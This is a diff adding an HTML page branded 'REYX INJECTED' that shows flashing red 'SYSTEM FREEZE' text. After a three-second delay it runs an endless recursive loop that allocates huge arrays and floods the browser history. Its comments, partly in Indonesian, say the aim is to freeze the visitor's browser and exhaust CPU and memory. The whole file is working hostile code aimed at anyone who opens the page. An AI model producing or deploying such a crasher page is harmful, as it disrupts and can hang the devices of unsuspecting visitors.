@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CRITICAL FAILURE :: REYX INJECTED</title>
+    <style>
+        body { background-color: #000; color: #ff0000; font-family: 'Courier New', monospace; overflow: hidden; text-align: center; padding-top: 20%; }
+        .glitch { font-size: 5vw; font-weight: bold; animation: pulse 0.1s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
+    </style>
+</head>
+<body>
+
+    <div class="glitch">SYSTEM FREEZE :: REYX INJECTED</div>
+    <div style="color: white; margin-top: 20px;">MEMORY OVERFLOW INITIATED...</div>
+
+    <script>
+        // MODUL FREEZE - OSKAC REX ENTERPRISE
+        function executeFreeze() {
+            console.log("REYX INJECTING...");
+            
+            // Triggering High-Intensity Recursive Loop
+            // Menghabiskan Call Stack dan CPU Cycle dalam milidetik
+            while(true) {
+                const data = new Array(1000000).fill("REYX_VIRUS_SPIDER");
+                window.history.pushState(null, "", window.location.href);
+                // Recursive call tanpa batas
+                executeFreeze();
+            }
+        }
+
+        // Delay eksekusi 3 detik agar user sempat melihat visual sebelum freeze total
+        setTimeout(() => {
+            executeFreeze();
+        }, 3000);
+    </script>
+</body>
+</html>
